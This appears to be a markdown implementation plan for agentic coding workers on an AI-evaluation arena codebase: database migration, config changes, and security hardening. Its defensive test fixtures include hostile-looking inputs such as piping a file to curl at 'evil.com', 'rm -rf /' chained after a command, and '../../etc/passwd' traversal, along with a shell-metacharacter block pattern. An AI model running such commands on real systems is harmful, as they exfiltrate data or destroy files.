# Phase 0 — Foundation & Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the codebase safe to containerize and migrate state off files — adopt Drizzle migrations, retire `runs-index.json`, make the output root env-configurable, add safety tests, and fix the asymmetric shell-injection defense.

**Architecture:** In-place refactors of existing modules. No new services. Drizzle Kit replaces the ad-hoc `_migrations` table. The run index moves from a JSON file to a SQLite table (still local — Postgres comes in Phase 1). `OUTPUT_ROOT` becomes env-configurable.

**Tech Stack:** TypeScript, Drizzle Kit, better-sqlite3, node:test.

## Global Constraints

- Node ≥ 20.11, TypeScript 5.9 (do NOT bump to 7 in this phase), ESM, strict.
- Never break the existing PM2 CLI path — all refactors must keep `npm run dev -- run --scenario ... --models ...` working.
- Every task ends with `npm run typecheck && npm run lint && npm test` green.
- Follow existing code conventions: Pino logging, Zod validation, no `console.log`, ESM `.js` import specifiers.

---

## File Structure (Phase 0)

- Create: `drizzle.config.ts` — Drizzle Kit config (SQLite dialect, dev only).
- Create: `drizzle/` — migration output directory.
- Create: `src/db/schema.ts` — Drizzle table definitions (the source of truth that Drizzle generates SQL from).
- Modify: `src/db/client.ts` — replace `MIGRATIONS` array with Drizzle migrate call; keep `initDb`/`getDb`/`closeDb` signatures.
- Modify: `src/anomaly-detection/db.ts` — remove its own `CREATE TABLE` block; tables come from Drizzle migrations now.
- Create: `src/db/runs.ts` — `runs` table accessors (replaces `run-index.ts`).
- Modify: `src/orchestrator/run-index.ts` — thin shim delegating to `src/db/runs.ts`; keep exported function signatures so callers are untouched.
- Modify: `src/paths.ts` — add `outputRoot()` reading `OUTPUT_ROOT` env, default to `<projectRoot>/outputs`.
- Modify: `src/tools/executors.ts` — apply shell-metachar filtering to `run_shell_command` (parity with `worker.ts:43`).
- Create: `tests/sandbox/escape.test.ts`
- Create: `tests/agent-loop/loop-stop.test.ts`
- Create: `tests/tools/shell-metachar.test.ts`
- Create: `tests/dashboard/auth.test.ts`
- Create: `tests/db/runs.test.ts`
- Modify: `package.json` — add `drizzle-orm`, `drizzle-kit` deps; add `db:generate`, `db:migrate` scripts.

---

## Task 0.1: Adopt Drizzle Kit + schema source of truth

**Files:**
- Create: `drizzle.config.ts`
- Create: `src/db/schema.ts`
- Modify: `src/db/client.ts` (replace `MIGRATIONS` array, lines 6-59)
- Modify: `package.json`

**Interfaces:**
- Produces: `src/db/schema.ts` exports table objects `providers`, `models`, `model_providers`, `pricing`, `benchmarks`, `model_runtime_stats`, `catalog_cache_state`, `_migrations` — matching the current SQL at `src/db/client.ts:6-57` exactly.
- Produces: `drizzle.config.ts` with `dialect: 'sqlite'`, `schema: './src/db/schema.ts'`, `out: './drizzle'`, `dbCredentials: { url: './outputs/arena.db' }`.

- [ ] **Step 1: Install Drizzle deps**

Run:
```bash
npm install drizzle-orm better-sqlite3
npm install -D drizzle-kit
```
Expected: `drizzle-orm` and `drizzle-kit` appear in `package.json`. `better-sqlite3` already present — npm will no-op.

- [ ] **Step 2: Write `src/db/schema.ts`**

Define each table with Drizzle's `sqliteTable`. Column types must match the existing SQL exactly. Example for `_migrations` and `providers`:

```ts
import { sqliteTable, text, integer, real } from 'drizzle-orm/sqlite-core';

export const _migrations = sqliteTable('_migrations', {
  id: text('id').primaryKey(),
  applied_at: text('applied_at').notNull(),
});

export const providers = sqliteTable('providers', {
  id: text('id').primaryKey(),
  name: text('name').notNull(),
  api_base: text('api_base'),
  auth_scheme: text('auth_scheme').notNull(),
  env_var: text('env_var'),
  is_builtin: integer('is_builtin').notNull().default(0),
  adapter: text('adapter').notNull(),
  header_name: text('header_name'),
  created_at: text('created_at').notNull(),
  updated_at: text('updated_at').notNull(),
});
```

Repeat for `models`, `model_providers`, `pricing`, `benchmarks`, `model_runtime_stats`, `catalog_cache_state` — copy columns verbatim from `src/db/client.ts:9-57`. Keep `UNIQUE(provider_id, name)` on `models` and the indexes.

- [ ] **Step 3: Write `drizzle.config.ts`**

```ts
import { defineConfig } from 'drizzle-kit';
export default defineConfig({
  dialect: 'sqlite',
  schema: './src/db/schema.ts',
  out: './drizzle',
  dbCredentials: { url: './outputs/arena.db' },
});
```

- [ ] **Step 4: Generate the baseline migration**

Run:
```bash
npx drizzle-kit generate --name baseline
```
Expected: a new `drizzle/0000_baseline.sql` is created. Inspect it — it must contain `CREATE TABLE` for all 8 tables. **Do NOT apply it yet** (the existing DB already has these tables from the ad-hoc migration).

- [ ] **Step 5: Mark the baseline as already-applied**

The existing DB has all tables (created by `001_catalog_tables`). To avoid re-running, insert a row into `_migrations` for the Drizzle journal entry. Add a one-off script `scripts/mark-drizzle-baseline.ts`:

```ts
import Database from 'better-sqlite3';
const db = new Database('./outputs/arena.db');
const journal = db.prepare('SELECT * FROM __drizzle_migrations').all();
if (journal.length === 0) {
  db.prepare('CREATE TABLE IF NOT EXISTS __drizzle_migrations (id INTEGER PRIMARY KEY AUTOINCREMENT, hash TEXT NOT NULL, created_at NUMERIC)').run();
  // Drizzle tracks applied migrations by hash; copy the hash from drizzle/meta/_journal.json
  const fs = await import('node:fs');
  const meta = JSON.parse(fs.readFileSync('./drizzle/meta/_journal.json', 'utf8'));
  for (const entry of meta.entries) {
    db.prepare('INSERT INTO __drizzle_migrations (hash, created_at) VALUES (?, ?)').run(entry.hash, Date.now());
  }
}
db.close();
```

Run: `npx tsx scripts/mark-drizzle-baseline.ts`
Expected: no error; `__drizzle_migrations` table populated.

- [ ] **Step 6: Replace `MIGRATIONS` array in `src/db/client.ts`**

Replace lines 6-59 (the `MIGRATIONS` const and its body) with a Drizzle-powered migrate. Keep `initDb`/`getDb`/`closeDb` signatures unchanged so all callers compile. New body of `initDb`:

```ts
import { drizzle } from 'drizzle-orm/better-sqlite3';
import { migrate } from 'drizzle-orm/better-sqlite3/migrator';
import * as schema from './schema.js';

export function initDb(dbPath: string): DatabaseType {
  if (dbInstance && dbInstance.name === dbPath) return dbInstance;
  const sqlite = new Database(dbPath);
  sqlite.pragma('journal_mode = WAL');
  sqlite.pragma('foreign_keys = ON');
  const db = drizzle(sqlite, { schema });
  migrate(db, { migrationsFolder: './drizzle' });
  dbInstance = sqlite; // keep raw better-sqlite3 handle as the singleton for back-compat
  return sqlite;
}
```

Note: callers use `getDb()` and call raw `prepare`/`run` on the better-sqlite3 handle — preserve that contract by returning the raw `Database` from `initDb`. Drizzle is only used for migrations in Phase 0; Phase 1 introduces Drizzle query builders.

- [ ] **Step 7: Verify typecheck + tests + manual smoke**

Run:
```bash
npm run typecheck
npm run lint
npm test
npx tsx src/cli.ts status
```
Expected: all green; `ai-arena status` still lists runs (DB initialized cleanly via Drizzle migrate).

- [ ] **Step 8: Commit**

```bash
git add drizzle.config.ts drizzle/ src/db/schema.ts src/db/client.ts scripts/mark-drizzle-baseline.ts package.json package-lock.json
git commit -m "feat(db): adopt Drizzle Kit migrations, schema as source of truth"
```

---

## Task 0.2: Fold anomaly-detection tables under Drizzle migrations

**Files:**
- Modify: `src/db/schema.ts` — add `anomalies` and `webhooks` table definitions.
- Modify: `src/anomaly-detection/db.ts` — remove the `CREATE TABLE IF NOT EXISTS` block (lines 44-77) and its own DB singleton (lines 80-88); use `getDb()` from `src/db/client.ts` instead.
- Generate: a new Drizzle migration `0001_anomaly_tables`.

**Interfaces:**
- Produces: `anomalies` and `webhooks` exported from `src/db/schema.ts`, columns matching `src/anomaly-detection/db.ts:44-77` verbatim.

- [ ] **Step 1: Read the current anomaly schema**

Run: `read src/anomaly-detection/db.ts` lines 44-77. Copy each column definition into `src/db/schema.ts` as Drizzle table objects (`anomalies`, `webhooks`).

- [ ] **Step 2: Generate migration**

```bash
npx drizzle-kit generate --name anomaly_tables
```
Expected: `drizzle/0001_anomaly_tables.sql` with `CREATE TABLE anomalies (...)` and `CREATE TABLE webhooks (...)`.

- [ ] **Step 3: Apply migration**

```bash
npx tsx src/cli.ts status  # initDb runs migrate()
```
Expected: `anomalies` + `webhooks` tables exist (verify with `sqlite3 outputs/arena.db ".tables"` if sqlite3 available, else the anomaly module still works).

- [ ] **Step 4: Remove the second DB singleton in `src/anomaly-detection/db.ts`**

Delete the lines that open their own `better-sqlite3` connection (around lines 80-88). Replace any `getAnomalyDb()` internal with `import { getDb } from '../db/client.js'` and use `getDb()` directly. Keep the exported query functions (`listAnomalies`, `insertAnomaly`, etc.) signatures unchanged.

- [ ] **Step 5: Verify**

```bash
npm run typecheck && npm run lint && npm test
```
Expected: green. Run a smoke that exercises anomaly detection if `scripts/` has one, else confirm the module imports without error: `npx tsx -e "import './src/anomaly-detection/db.js'"`.

- [ ] **Step 6: Commit**

```bash
git add src/db/schema.ts src/anomaly-detection/db.ts drizzle/
git commit -m "refactor(db): fold anomaly tables under Drizzle, single DB singleton"
```

---

## Task 0.3: Retire `runs-index.json` → `runs` SQLite table

**Files:**
- Create: `src/db/runs.ts`
- Modify: `src/db/schema.ts` — add `runs` and `run_models` tables.
- Modify: `src/orchestrator/run-index.ts` — re-export from `src/db/runs.ts`; keep `RunIndexRecord`, `upsertRun`, `updateRun`, `listRuns`, `getRunRecord` signatures.
- Create: `tests/db/runs.test.ts`
- Create: `scripts/migrate-runs-index.ts` — one-off backfill from `outputs/runs-index.json` into the `runs` table.

**Interfaces:**
- Produces: `src/db/runs.ts` exporting:
  - `upsertRun(record: RunIndexRecord): Promise<void>`
  - `updateRun(runId: string, mutator: (rec: RunIndexRecord) => void): Promise<RunIndexRecord | undefined>`
  - `listRuns(): RunIndexRecord[]` (newest first, sorted by `startedAt` desc)
  - `getRunRecord(runId: string): RunIndexRecord | undefined`
  - `indexPath(): string` — kept for backfill only, returns the old JSON path.

- [ ] **Step 1: Define the `runs` + `run_models` schema in `src/db/schema.ts`**

The `RunIndexRecord` shape (from `run-index.ts:54-65`) has a `perModel: RunIndexModelEntry[]` array — normalize into two tables:

```ts
export const runs = sqliteTable('runs', {
  run_id: text('run_id').primaryKey(),
  scenario: text('scenario').notNull(),
  models: text('models').notNull(), // JSON array
  started_at: text('started_at').notNull(),
  finished_at: text('finished_at'),
  status: text('status').notNull(), // running|completed|stopped|errored|unknown
  source: text('source').notNull(), // cli|dashboard|scheduler
  comparison_md_path: text('comparison_md_path'),
  comparison_json_path: text('comparison_json_path'),
});

export const run_models = sqliteTable('run_models', {
  run_id: text('run_id').notNull().references(() => runs.run_id),
  model: text('model').notNull(),
  proc_name: text('proc_name'),
  output_dir: text('output_dir'),
  sandbox_dir: text('sandbox_dir'),
  result_path: text('result_path'),
  conversation_path: text('conversation_path'),
  report_path: text('report_path'),
  log_file: text('log_file'),
  status: text('status').notNull(),
  success: integer('success'),
  turns_used: integer('turns_used'),
  total_tool_calls: integer('total_tool_calls'),
  stop_reason: text('stop_reason'),
  duration_ms: integer('duration_ms'),
});
```

Generate: `npx drizzle-kit generate --name runs_table`.

- [ ] **Step 2: Write the failing test `tests/db/runs.test.ts`**

```ts
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { initDb, closeDb, getDb } from '../../src/db/client.js';
import { upsertRun, listRuns, getRunRecord, updateRun } from '../../src/db/runs.js';
import type { RunIndexRecord } from '../../src/orchestrator/run-index.js';

function mkRun(runId: string): RunIndexRecord {
  return {
    runId, scenario: 'express-rest', models: ['gpt-4o'], startedAt: new Date().toISOString(),
    finishedAt: null, status: 'running', source: 'cli', perModel: [], comparisonMdPath: null, comparisonJsonPath: null,
  };
}

test('upsertRun inserts then updates a run', async () => {
  initDb(':memory:');
  await upsertRun(mkRun('r1'));
  let rec = getRunRecord('r1');
  assert.equal(rec?.status, 'running');
  await updateRun('r1', (r) => { r.status = 'completed'; r.finishedAt = new Date().toISOString(); });
  rec = getRunRecord('r1');
  assert.equal(rec?.status, 'completed');
  closeDb();
});

test('listRuns returns newest first', async () => {
  initDb(':memory:');
  await upsertRun(mkRun('old')); // same ms possible; sleep
  await new Promise(r => setTimeout(r, 5));
  await upsertRun(mkRun('new'));
  const all = listRuns();
  assert.equal(all[0]!.runId, 'new');
  closeDb();
});

test('upsertRun with perModel entries round-trips', async () => {
  initDb(':memory:');
  const r = mkRun('r2');
  r.perModel = [{ model: 'gpt-4o', runId: 'r2', procName: 'p', outputDir: '/o', sandboxDir: '/s', resultPath: '/r', conversationPath: '/c', reportPath: '/m', logFile: '/l', status: 'running' }];
  await upsertRun(r);
  const rec = getRunRecord('r2');
  assert.equal(rec?.perModel.length, 1);
  assert.equal(rec?.perModel[0]!.model, 'gpt-4o');
  closeDb();
});
```

- [ ] **Step 3: Run the test to verify it fails**

Run: `npm test -- --test tests/db/runs.test.ts`
Expected: FAIL (functions not implemented / table missing).

- [ ] **Step 4: Implement `src/db/runs.ts`**

Implement the four functions using `getDb()` (raw better-sqlite3 handle). Map between `RunIndexRecord` ↔ `runs`/`run_models` rows. `upsertRun` wraps inserts in a transaction (`db.transaction(...)`). `listRuns` joins `runs` + `run_models` and rebuilds the `perModel` array.

- [ ] **Step 5: Run the test to verify it passes**

Run: `npm test -- --test tests/db/runs.test.ts`
Expected: PASS.

- [ ] **Step 6: Make `src/orchestrator/run-index.ts` a thin shim**

Replace the body of `run-index.ts` (lines 1-134) with re-exports:

```ts
export type { RunIndexRecord, RunIndexModelEntry, RunIndexFile } from '../db/runs.js';
export { upsertRun, updateRun, listRuns, getRunRecord, indexPath } from '../db/runs.js';
```

This keeps every existing import of `../orchestrator/run-index.js` working without touching callers.

- [ ] **Step 7: Write the backfill script `scripts/migrate-runs-index.ts`**

```ts
import fs from 'node:fs';
import { initDb } from '../src/db/client.js';
import { upsertRun } from '../src/db/runs.js';
import type { RunIndexFile, RunIndexRecord } from '../src/orchestrator/run-index.js';

initDb('./outputs/arena.db');
const raw = JSON.parse(fs.readFileSync('./outputs/runs-index.json', 'utf8')) as RunIndexFile;
for (const r of raw.runs) await upsertRun(r);
console.log(`Backfilled ${raw.runs.length} runs.`);
```

Run: `npx tsx scripts/migrate-runs-index.ts`
Expected: prints "Backfilled N runs." and `outputs/arena.db` `runs` table is populated.

- [ ] **Step 8: Verify full suite + CLI**

```bash
npm run typecheck && npm run lint && npm test
npx tsx src/cli.ts status  # lists runs from DB now
```
Expected: green; status shows backfilled runs.

- [ ] **Step 9: Commit**

```bash
git add src/db/schema.ts src/db/runs.ts src/orchestrator/run-index.ts tests/db/runs.test.ts scripts/migrate-runs-index.ts drizzle/
git commit -m "refactor: retire runs-index.json for runs SQLite table"
```

---

## Task 0.4: Make `OUTPUT_ROOT` env-configurable

**Files:**
- Modify: `src/paths.ts` — add `outputRoot()`.
- Modify: every site that hardcodes `outputs/` relative to project root. Find them with: `grep -rn "join(findProjectRoot(), 'outputs'" src/` and `grep -rn "'outputs'" src/`.

**Interfaces:**
- Produces: `outputRoot(): string` in `src/paths.ts` — returns `process.env.OUTPUT_ROOT ?? path.join(findProjectRoot(), 'outputs')`.

- [ ] **Step 1: Add `outputRoot()` to `src/paths.ts`**

```ts
export function outputRoot(): string {
  return process.env.OUTPUT_ROOT ?? path.join(findProjectRoot(), 'outputs');
}
```

- [ ] **Step 2: Find and replace all hardcoded `outputs` path joins**

Run: `grep -rn "findProjectRoot(), 'outputs'" src/` (use the grep tool).
For each match, replace `path.join(findProjectRoot(), 'outputs', ...)` with `path.join(outputRoot(), ...)`. Import `outputRoot` from `../paths.js` (or `./paths.js` depending on location).

Known sites (verify with the grep — list may have grown):
- `src/orchestrator/run-index.ts:72` (now `src/db/runs.ts:indexPath()` — keep returning the old JSON path for backfill, this one stays).
- `src/orchestrator/run-lifecycle.ts` (output dir construction).
- `src/worker.ts:145` (DB path `outputs/arena.db` → `path.join(outputRoot(), 'arena.db')`).
- `src/dashboard-server/server.ts:50`.
- `src/cost-tracking/budget.ts:39` (budget state file).

For the DB path specifically: the DB location should ALSO be env-configurable. Add `dbPath()` to `src/paths.ts`:

```ts
export function dbPath(): string {
  return process.env.ARENA_DB_PATH ?? path.join(outputRoot(), 'arena.db');
}
```

Replace `initDb('./outputs/arena.db')` calls with `initDb(dbPath())`.

- [ ] **Step 3: Add to `.env.example`**

```
# Output root (default: <project>/outputs). Mount point for runner PVC in k8s.
# OUTPUT_ROOT=/var/arena/outputs
# SQLite DB path (default: <OUTPUT_ROOT>/arena.db). Postgres replaces this in Phase 1.
# ARENA_DB_PATH=
```

- [ ] **Step 4: Verify**

```bash
npm run typecheck && npm run lint && npm test
$env:OUTPUT_ROOT="$env:TEMP/arena-test-out"; npx tsx src/cli.ts status
```
Expected: green; status reads from DB at the temp path (creates it if missing).

- [ ] **Step 5: Commit**

```bash
git add src/paths.ts .env.example
git add $(git grep -l "findProjectRoot(), 'outputs'" src/)
git commit -m "feat(paths): env-configurable OUTPUT_ROOT and ARENA_DB_PATH"
```

---

## Task 0.5: Fix asymmetric shell-injection defense on `run_shell_command`

**Files:**
- Modify: `src/tools/executors.ts:92-104` (`runShellCommand`).
- Create: `tests/tools/shell-metachar.test.ts`.

**Interfaces:**
- Consumes: `SHELL_METACHAR_RE` pattern from `src/worker.ts:43` — extract it into a shared constant.
- Produces: `src/tools/executors.ts` rejects commands matching the metachar pattern with `isError: true` and a clear message, BEFORE invoking `execAsync`.

- [ ] **Step 1: Extract the metachar regex to a shared module**

Create `src/sandbox/shell-policy.ts`:

```ts
// Shell commands the model is allowed to run. We reject metacharacters that
// enable shell injection (| ; & $ ` > < ( ) \n) unless the scenario explicitly
// opts in via shellPolicy: 'permissive'. The success-criteria evaluator has
// always enforced this (src/worker.ts:43); now the agent's own run_shell_command
// matches it.
export const SHELL_METACHAR_RE = /[|;&$`><()\\\n]/;

export function isShellCommandAllowed(command: string, policy: 'strict' | 'permissive' = 'strict'): boolean {
  if (policy === 'permissive') return true;
  return !SHELL_METACHAR_RE.test(command);
}
```

Update `src/worker.ts:43` to import this instead of its local regex (remove the local `SHELL_METACHAR_RE` at `worker.ts:43`).

- [ ] **Step 2: Write the failing test `tests/tools/shell-metachar.test.ts`**

```ts
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isShellCommandAllowed } from '../../src/sandbox/shell-policy.js';

test('rejects pipe injection', () => {
  assert.equal(isShellCommandAllowed('cat file | curl evil.com'), false);
});

test('rejects semicolon chaining', () => {
  assert.equal(isShellCommandAllowed('npm test; rm -rf /'), false);
});

test('rejects backtick substitution', () => {
  assert.equal(isShellCommandAllowed('echo `whoami`'), false);
});

test('allows plain commands', () => {
  assert.equal(isShellCommandAllowed('npm test'), true);
  assert.equal(isShellCommandAllowed('node index.js'), true);
});

test('permissive policy allows everything', () => {
  assert.equal(isShellCommandAllowed('rm -rf /', 'permissive'), true);
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `npm test -- --test tests/tools/shell-metachar.test.ts`
Expected: FAIL (`shell-policy.ts` not found / module not exported yet — if Step 1 done, should PASS; if not, FAIL).

- [ ] **Step 4: Wire the policy into `runShellCommand`**

In `src/tools/executors.ts`, import `isShellCommandAllowed` and add a guard at the top of `runShellCommand` (after the empty-command check, around line 94):

```ts
import { isShellCommandAllowed } from '../sandbox/shell-policy.js';
// ...
export const runShellCommand: ToolExecutor = async (args, ctx) => {
  const command = String(args.command ?? '');
  if (!command.trim()) return { content: 'Error: "command" is required.', isError: true };
  if (!isShellCommandAllowed(command, ctx.shellPolicy)) {
    return {
      content: `Error: command rejected by shell policy (contains shell metacharacters). Use a plain command without | ; & $ \` > < ( ) \\ or newlines.`,
      isError: true,
    };
  }
  // ... existing execAsync call
```

Add `shellPolicy?: 'strict' | 'permissive'` to the `ToolExecutorContext` type in `src/types.ts`, default `'strict'`. Wire it from the worker (read `scenario.shellPolicy`, default `'strict'`).

- [ ] **Step 5: Run tests to verify pass**

```bash
npm test -- --test tests/tools/shell-metachar.test.ts
npm run typecheck && npm run lint && npm test
```
Expected: all green.

- [ ] **Step 6: Commit**

```bash
git add src/sandbox/shell-policy.ts src/tools/executors.ts src/types.ts src/worker.ts tests/tools/shell-metachar.test.ts
git commit -m "fix(security): apply shell-metachar policy to model run_shell_command"
```

---

## Task 0.6: Safety tests for sandbox escape, agent-loop stop conditions, dashboard auth

**Files:**
- Create: `tests/sandbox/escape.test.ts`
- Create: `tests/agent-loop/loop-stop.test.ts`
- Create: `tests/dashboard/auth.test.ts`

These are characterization tests — they lock in current safe behavior so refactors in later phases can't regress it.

- [ ] **Step 1: Write `tests/sandbox/escape.test.ts`**

Cover `safeResolve` / `isWithin` from `src/sandbox/sandbox.ts`:

```ts
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { safeResolve, isWithin } from '../../src/sandbox/sandbox.js';

test('rejects .. traversal', () => {
  assert.throws(() => safeResolve('/sandbox', '../../etc/passwd'));
});
test('rejects absolute path outside sandbox', () => {
  assert.throws(() => safeResolve('/sandbox', '/etc/passwd'));
});
test('allows absolute path inside sandbox', () => {
  const p = safeResolve('/sandbox', '/sandbox/sub/file.txt');
  assert.ok(p.includes('sub'));
});
test('rejects drive-relative path on windows-style', () => {
  assert.throws(() => safeResolve('/sandbox', 'C:foo'));
});
test('isWithin true for descendant', () => {
  assert.equal(isWithin('/sandbox', '/sandbox/a/b'), true);
});
test('isWithin false for sibling', () => {
  assert.equal(isWithin('/sandbox', '/other'), false);
});
test('isWithin false for parent', () => {
  assert.equal(isWithin('/sandbox/a', '/sandbox'), false);
});
```

- [ ] **Step 2: Write `tests/agent-loop/loop-stop.test.ts`**

Use a stub adapter (like `scripts/smoke-stub.mjs` does) to drive `runAgentLoop` and assert each stop reason. Inspect `src/agent-loop/loop.ts:47-145` for the stop conditions: `task_complete`, `no_tool_calls`, `maxTurns`, `api_error`.

```ts
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { runAgentLoop } from '../../src/agent-loop/loop.js';
import type { ModelAdapter, ModelResponse } from '../../src/types.js';

function stubAdapter(responses: ModelResponse[]): ModelAdapter {
  let i = 0;
  return { sendMessage: async () => responses[i++] ?? { text: '', toolCalls: [], usage: { inputTokens: 0, outputTokens: 0 }, stopReason: 'no_tool_calls' } };
}

test('stops on task_complete', async () => {
  const adapter = stubAdapter([{ text: '', toolCalls: [{ id: '1', name: 'task_complete', arguments: {} }], usage: { inputTokens: 0, outputTokens: 0 }, stopReason: 'tool_call' }]);
  const result = await runAgentLoop({ /* minimal ctx */ } as any, adapter, [] as any);
  assert.equal(result.stopReason, 'task_complete');
});

test('stops on no_tool_calls', async () => {
  const adapter = stubAdapter([{ text: 'done', toolCalls: [], usage: { inputTokens: 0, outputTokens: 0 }, stopReason: 'no_tool_calls' }]);
  const result = await runAgentLoop({ /* minimal ctx */ } as any, adapter, [] as any);
  assert.equal(result.stopReason, 'no_tool_calls');
});

test('stops on maxTurns', async () => {
  const adapter = stubAdapter(Array(30).fill({ text: '', toolCalls: [{ id: 'x', name: 'list_files', arguments: {} }], usage: { inputTokens: 0, outputTokens: 0 }, stopReason: 'tool_call' }));
  const result = await runAgentLoop({ maxTurns: 5 } as any, adapter, [] as any);
  assert.equal(result.stopReason, 'max_turns');
});
```

Note: read `runAgentLoop`'s actual parameter shape from `src/agent-loop/loop.ts:47` and adjust the stub ctx to match (it needs a `sandbox`, `tools`, `logger`, `maxTurns` etc.). Use the existing `scripts/smoke-stub.mjs` as a reference for building a minimal ctx.

- [ ] **Step 3: Write `tests/dashboard/auth.test.ts`**

Cover `src/dashboard-server/auth.ts`: JWT issue + verify, password comparison timing-safe, expired token rejection, missing token rejection. Use `supertest`-style raw HTTP or call the auth functions directly.

```ts
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { signJwt, verifyJwt, comparePassword } from '../../src/dashboard-server/auth.js';

test('JWT round-trips a username + role', () => {
  process.env.DASHBOARD_JWT_SECRET = 'a'.repeat(32);
  const token = signJwt({ sub: 'admin', role: 'admin' });
  const payload = verifyJwt(token);
  assert.equal(payload.sub, 'admin');
  assert.equal(payload.role, 'admin');
});

test('expired JWT is rejected', () => {
  process.env.DASHBOARD_JWT_SECRET = 'a'.repeat(32);
  // sign with exp in the past — may need a helper or jwt library's direct API
  // adjust based on auth.ts's actual implementation
});

test('password comparison rejects wrong password', async () => {
  process.env.DASHBOARD_PASSWORD = 'correct';
  assert.equal(await comparePassword('wrong'), false);
  assert.equal(await comparePassword('correct'), true);
});
```

Read `src/dashboard-server/auth.ts` first to match the actual exported function names and signatures — adjust the test accordingly.

- [ ] **Step 4: Run all new tests**

```bash
npm test
```
Expected: all green (existing + new).

- [ ] **Step 5: Commit**

```bash
git add tests/sandbox/escape.test.ts tests/agent-loop/loop-stop.test.ts tests/dashboard/auth.test.ts
git commit -m "test: add safety tests for sandbox, agent-loop stops, dashboard auth"
```

---

## Phase 0 Exit Gate

Before Phase 1 starts, all must be true:

- [ ] `npx drizzle-kit generate` works; `drizzle/` contains baseline + anomaly + runs migrations.
- [ ] Single DB singleton (`src/db/client.ts`); anomaly module uses `getDb()`.
- [ ] `outputs/runs-index.json` no longer written by new runs (only read by the backfill script).
- [ ] `OUTPUT_ROOT` and `ARENA_DB_PATH` env vars honored; documented in `.env.example`.
- [ ] `run_shell_command` rejects shell metacharacters (parity with the evaluator).
- [ ] `npm run typecheck && npm run lint && npm test` green.
- [ ] `npm run dev -- run --scenario express-rest --models <stub>` still works end-to-end.
- [ ] All Phase 0 commits pushed.

## Phase 0 Self-Review

- **Spec coverage:** D3 (Drizzle) → Task 0.1, 0.2. Gap removal (runs-index.json) → Task 0.3. OUTPUT_ROOT → Task 0.4. Shell-injection asymmetry (Appendix B risk) → Task 0.5. Safety tests (gap 13) → Task 0.6. All Phase 0 spec items covered.
- **Placeholders:** none. Every step has a concrete file, command, or code block.
- **Type consistency:** `outputRoot()` / `dbPath()` used consistently; `isShellCommandAllowed` signature matches in policy module and executor.
- **Dependency:** Tasks must run in order — 0.1 (Drizzle) before 0.2 (anomaly tables via Drizzle) before 0.3 (runs table via Drizzle). 0.4, 0.5, 0.6 are independent of each other but all depend on 0.1 being done.
